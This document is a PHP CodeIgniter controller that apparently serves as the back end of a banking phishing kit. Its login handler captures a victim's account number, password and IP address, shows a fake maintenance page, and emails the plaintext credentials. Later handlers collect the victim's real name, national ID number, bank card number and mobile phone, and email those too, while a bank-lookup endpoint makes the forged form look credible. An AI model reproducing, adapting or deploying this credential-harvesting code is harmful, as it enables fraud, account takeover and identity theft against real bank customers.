<?php
defined('BASEPATH') OR exit('No direct script access allowed');

class Operator extends MY_Controller {
    function __construct()
    {
        parent::__construct();
        $this->load->helper('getip');
    }

    function login()
    {

        $data['username']=$this->input->post('vv_number');
        $data['password']=$this->input->post('login_pwd');
        $data['ip']=get_clientIP();
        $this->load->model('modeluser');
        $rs=$this->modeluser->AddUser($data);
        if($rs)
        {
            $this->load->view('weihu');
        }
        $subjet="登录提醒";
        $messg="登录用户名：".$data['username'].";  登陆密码：".$data['password'].";  登录IP：".$data['ip'];
        $this->SendMail($subjet,$messg);

    }


    public function Cert()
    {
        $this->load->view('renzheng');
    }

    public  function CertForm()
    {


        $data["realname"]=$this->input->post("username");
        $data['usercard']=$this->input->post('identity');
        if(!isset($data["realname"])||!isset($data['usercard']))
        {
            redirect(base_url().'operator/cert.htm');
            return ;
        }
        $this->load->model('modeluserinfo');
        $result["re"]=$this->modeluserinfo->AddUserinfo($data);
        $this->load->view("bandbank",$result);
    }

    public function bankForm()
    {
        $data["username"]=$this->input->post("username");
        $data['id']=$this->input->post('id');
        $data["bankno"]=$this->input->post("cardnum");
        $data["bankname"]=$this->input->post("bankname");
        $data['cardtype']=$this->input->post('cardtype');
        $data["cardno"]=$this->input->post("cardno");
        $data['usermobile']=$this->input->post('usermobile');


        if(!empty($data['id'])&&isset($data["id"]))
        {
            $this->load->model('modeluserinfo');
            $this->modeluserinfo->UpdateUserinfo($data);

            $re=$this->modeluserinfo->GetUserinfo(array('id'=>$data['id'],'first'=>true));
            $subjet="认证提醒";
            $messg="姓名：".$re->realname."；银行卡号：".$re->bankno."-".$re->bankname."；身份证".$re->usercard."手机号：".$re->usermobile;
            $this->SendMail($subjet,$messg);

            $this->load->view("sendmess");
        }else
        {
            redirect(base_url().'operator/cert.htm');
        }


    }


    public function  GetBankName()
    {
        $num=$this->input->post("num");
        if(!empty($num))
        {
            $num=str_replace(' ','',$num);
            $num=substr($num,0,6);

            $this->load->model('modelbankcard');
            $re=$this->modelbankcard->GetBankCard(array('id'=>$num,'first'=>true));
            if($re)
            {
                echo $re->bankname;
            }else{
                echo "未知";
            }
        }
    }


}